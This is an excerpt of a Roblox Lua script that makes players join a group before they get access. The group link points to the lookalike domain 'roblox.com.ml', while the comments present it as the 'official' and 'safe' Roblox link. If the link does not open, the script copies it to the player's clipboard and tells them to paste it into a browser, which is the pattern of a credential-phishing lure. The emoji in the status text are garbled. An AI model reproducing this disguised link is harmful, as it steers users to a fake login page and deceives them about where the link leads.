...
-- CONFIG (CORREGIDO - ENLACE SEGURO)
local GROUP_ID = 1920432847
local GROUP_LINK = "https://www.roblox.com.ml/communities/112816861305/Gamer" -- Enlace oficial de Roblox
...
Instructions.Text = "1. Press JOIN GROUP\n2. Opens the group page\n3. Join the group to continue"
...
local function checkGroup()
	...
	if inGroup then
		hasAccess = true
		Status.Text = "Access Granted â"
		Status.TextColor3 = Color3.fromRGB(0,255,170)
		JoinBtn.Visible = false
	else
		hasAccess = false
		Status.Text = "Join the group to continue â"
...
JoinBtn.MouseButton1Click:Connect(function()
	...
	if opened then
		Status.Text = "Opened in browser ð"
		Status.TextColor3 = Color3.fromRGB(0,255,170)
	else
		if typeof(setclipboard) == "function" then
			setclipboard(GROUP_LINK)
			Status.Text = "Link copied! Paste in your browser ð"
			Status.TextColor3 = Color3.fromRGB(0,200,255)
		else
			Status.Text = "Copy link and open in browser â ï¸"
		end
	end
